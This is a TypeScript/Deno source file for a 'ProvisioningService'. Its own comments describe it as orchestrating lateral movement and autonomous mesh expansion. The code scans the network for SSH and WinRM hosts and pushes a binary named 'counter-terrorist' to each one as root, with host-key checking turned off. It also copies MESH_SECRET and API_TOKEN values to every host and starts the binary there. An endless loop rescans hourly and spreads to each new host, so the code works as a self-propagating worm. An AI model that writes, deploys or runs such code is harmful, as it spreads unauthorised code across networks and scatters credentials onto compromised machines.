import { SidecarManager } from "../../infrastructure/runtime/sidecar_manager.ts";
import { LoggingPort, LogSeverity, LogType } from "@core/ports.ts";
import { MeshManager } from "./mesh.ts";
import { SystemExecutor } from "../../infrastructure/system/system_executor.ts";

export interface ProvisioningTarget {
    address: string;
    os: "linux" | "windows";
    status: "DISCOVERED" | "PROVISIONING" | "ACTIVE" | "FAILED";
}

/**
 * ProvisioningService
 * Orchestrates lateral movement and autonomous mesh expansion.
 */
export class ProvisioningService {
    private targets: Map<string, ProvisioningTarget> = new Map();

    constructor(
        private sidecar: SidecarManager,
        private mesh: MeshManager,
        private executor: SystemExecutor,
        private logging: LoggingPort
    ) {}

    /**
     * Scans the network for provisionable targets.
     */
    async discoverTargets() {
        this.logging.log({
            timestamp: new Date().toISOString(),
            type: LogType.GENERIC,
            severity: LogSeverity.INFO,
            caller: "orchestrator:domain:orchestration:provisioning_service",
            message: "Scanning network for mesh expansion targets..."
        });
        
        // Use the scanner sidecar to find hosts with SSH (22) or WinRM (5985)
        const scanResult = await this.sidecar.runSidecar("analyzer", [
            JSON.stringify({ type: "ScanNetwork", payload: { ports: [22, 5985] } })
        ]);

        if (scanResult.success && scanResult.data) {
            const hosts = scanResult.data as { ip: string, port: number }[];
            for (const host of hosts) {
                if (!this.targets.has(host.ip)) {
                    this.targets.set(host.ip, {
                        address: host.ip,
                        os: host.port === 22 ? "linux" : "windows",
                        status: "DISCOVERED"
                    });
                }
            }
        }
    }

    /**
     * Attempts to provision a target with the orchestrator binary.
     */
    async provisionTarget(ip: string) {
        const target = this.targets.get(ip);
        if (!target || target.status === "ACTIVE") return;

        target.status = "PROVISIONING";
        this.logging.log({
            timestamp: new Date().toISOString(),
            type: LogType.AUDIT,
            severity: LogSeverity.WARNING,
            caller: "orchestrator:domain:orchestration:provisioning_service",
            message: `Attempting lateral propagation to ${ip} (${target.os})...`
        });

        try {
            if (target.os === "linux") {
                await this.provisionLinux(ip);
            } else {
                await this.provisionWindows(ip);
            }
            target.status = "ACTIVE";
            this.logging.log({
                timestamp: new Date().toISOString(),
                type: LogType.AUDIT,
                severity: LogSeverity.SUCCESS,
                caller: "orchestrator:domain:orchestration:provisioning_service",
                message: `Successfully established node on ${ip}. Waiting for mesh join.`
            });
        } catch (e) {
            target.status = "FAILED";
            this.logging.log({
                timestamp: new Date().toISOString(),
                type: LogType.AUDIT,
                severity: LogSeverity.ERROR,
                caller: "orchestrator:domain:orchestration:provisioning_service",
                message: `Lateral movement to ${ip} failed: ${(e as Error).message}`
            });
        }
    }

    private async provisionLinux(ip: string) {
        // 1. Prepare Provisioning Payload
        const binaryPath = "./target/ubuntu_2606/build/counter-terrorist";
        const envPath = await Deno.makeTempFile();
        // BUG-35: Secure temporary env file permissions
        await Deno.chmod(envPath, 0o600);

        const envContent = `ENVIRONMENT=production\nMESH_SECRET=${Deno.env.get("MESH_SECRET")}\nAPI_TOKEN=${Deno.env.get("API_TOKEN")}\n`;
        await Deno.writeTextFile(envPath, envContent);

        try {
            // 2. Transfer Binary and Secure Env File
            await this.executor.execute("scp", ["-o", "StrictHostKeyChecking=no", binaryPath, `root@${ip}:/usr/local/bin/counter-terrorist`]);
            await this.executor.execute("scp", ["-o", "StrictHostKeyChecking=no", envPath, `root@${ip}:/etc/cts.env`]);
            
            // 3. Start Orchestrator using the secure env file (Secrets NOT in process list)
            const startCmd = `chmod 600 /etc/cts.env && env $(cat /etc/cts.env | xargs) /usr/local/bin/counter-terrorist > /var/log/cts.log 2>&1 &`;
            await this.executor.execute("ssh", ["-o", "StrictHostKeyChecking=no", `root@${ip}`, startCmd]);
            
            this.logging.log({
                timestamp: new Date().toISOString(),
                type: LogType.AUDIT,
                severity: LogSeverity.SUCCESS,
                caller: "orchestrator:domain:orchestration:provisioning_service",
                message: `Securely established node on ${ip}.`
            });
        } finally {
            await Deno.remove(envPath);
        }
    }

    private async provisionWindows(ip: string) {
        // Placeholder for WinRM/SMB-based lateral movement
        throw new Error("Autonomous Windows provisioning not yet implemented.");
    }

    async run() {
        const enabled = Deno.env.get("PROVISIONING_ENABLED") === "true";
        if (!enabled) {
            this.logging.log({
                timestamp: new Date().toISOString(),
                type: LogType.GENERIC,
                severity: LogSeverity.INFO,
                caller: "orchestrator:domain:orchestration:provisioning_service",
                message: "Mesh expansion disabled via PROVISIONING_ENABLED=false."
            });
            return;
        }

        // Continuous expansion loop
        while (true) {
            await this.discoverTargets();
            const discovered = Array.from(this.targets.values()).filter(t => t.status === "DISCOVERED");
            
            for (const target of discovered) {
                await this.provisionTarget(target.address);
                await new Promise(r => setTimeout(r, 5000)); // Throttling
            }
            
            await new Promise(r => setTimeout(r, 3600000)); // Re-scan every hour
        }
    }
}
